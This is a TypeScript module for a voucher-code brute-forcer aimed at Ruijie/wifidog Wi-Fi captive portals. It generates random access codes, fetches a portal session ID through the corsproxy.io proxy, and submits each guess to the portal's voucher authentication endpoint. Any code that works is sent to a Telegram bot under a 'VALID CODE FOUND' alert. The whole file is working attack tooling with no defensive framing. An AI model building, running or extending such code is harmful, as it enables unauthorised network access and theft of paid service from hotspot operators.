import { Config } from '../types';

// Helper to generate random code based on config
export const generateAccessCode = (config: Config): string => {
  let charset = '';
  if (config.useNumbers) charset += '0123456789';
  if (config.useLowercase) charset += 'abcdefghijklmnopqrstuvwxyz';

  // Fallback if nothing selected
  if (charset.length === 0) charset = '0123456789';

  let result = config.codePrefix || '';
  const remainingLength = Math.max(0, config.codeLength - result.length);

  for (let i = 0; i < remainingLength; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }

  return result;
};

// Simulate network delay
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// Session Fetcher with Proxy Support
export const fetchSessionId = async (config: Config): Promise<string | null> => {
  // 1. Check if user pasted a URL that ALREADY contains the session ID
  if (config.loginUrl) {
    try {
        const urlObj = new URL(config.loginUrl);
        const existingSid = urlObj.searchParams.get('sessionId');
        if (existingSid) {
            console.log("Extracted Session ID directly from Config URL:", existingSid);
            // Add a tiny delay to simulate "fetching" so the UI doesn't glitch
            await delay(100);
            return existingSid;
        }
    } catch (e) {
        // invalid url, ignore
    }
  }

  // 2. Simulation Mode
  if (config.simulationMode) {
    await delay(800);
    return 'sess_' + Math.random().toString(36).substring(2, 10);
  }

  // 3. Real Fetch via Proxy
  try {
    const PROXY_BASE = 'https://corsproxy.io/?';
    // We target the wifidog auth endpoint which usually redirects to the portal with sessionId
    const targetUrl = config.loginUrl; 
    
    const response = await fetch(PROXY_BASE + encodeURIComponent(targetUrl), {
      method: 'GET',
    });
    
    // The proxy returns the content of the final page. 
    // Sometimes the sessionId is in the final URL (response.url), 
    // or inside the HTML (if it's a meta refresh or JS redirect).
    // Or, simpler: we check the response URL itself if the proxy forwarded the redirect chain.
    
    // Attempt 1: Check URL params of the text response (if proxy simply returned the redirect body)
    const text = await response.text();
    
    // Regex to find sessionId=xxxxx inside the response text or links
    const match = text.match(/sessionId=([a-zA-Z0-9]+)/);
    if (match && match[1]) {
        return match[1];
    }

    return null;
  } catch (error) {
    console.error("Session fetch error:", error);
    return null;
  }
};

// Check Code Logic
export const checkCode = async (
  code: string, 
  sessionId: string, 
  config: Config
): Promise<{ valid: boolean; status: number; message: string }> => {
  
  if (config.simulationMode) {
    const isSuccess = Math.random() < 0.001; // Low chance
    await delay(150 + Math.random() * 300); // Realistic Jitter
    
    if (isSuccess) {
        return { valid: true, status: 200, message: 'true' };
    }
    if (Math.random() < 0.02) {
        return { valid: false, status: 401, message: 'session timed out' };
    }
    return { valid: false, status: 200, message: 'false' };
  }

  try {
    const PROXY_BASE = 'https://corsproxy.io/?';
    const target = `${config.targetUrl}/api/auth/voucher/?lang=en_US`;
    
    const response = await fetch(PROXY_BASE + encodeURIComponent(target), {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authority': 'portal-as.ruijienetworks.com',
      },
      body: JSON.stringify({
        accessCode: code,
        sessionId: sessionId,
        apiVersion: 1
      })
    });

    const text = await response.text();
    const valid = text.toLowerCase().includes('true');
    
    return {
      valid,
      status: response.status,
      message: text
    };
  } catch (error) {
    return { valid: false, status: 0, message: String(error) };
  }
};

// Telegram Sender
export const sendTelegramAlert = async (
  code: string, 
  sessionId: string, 
  config: Config
) => {
  if (!config.telegramBotToken || !config.telegramChatId) return;

  const msg = `✅ VALID CODE FOUND: ${code}\nSession: ${sessionId}`;
  const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`;
  
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.telegramChatId,
        text: msg,
        parse_mode: 'HTML'
      })
    });
  } catch (e) {
    console.error("Telegram send failed", e);
  }
};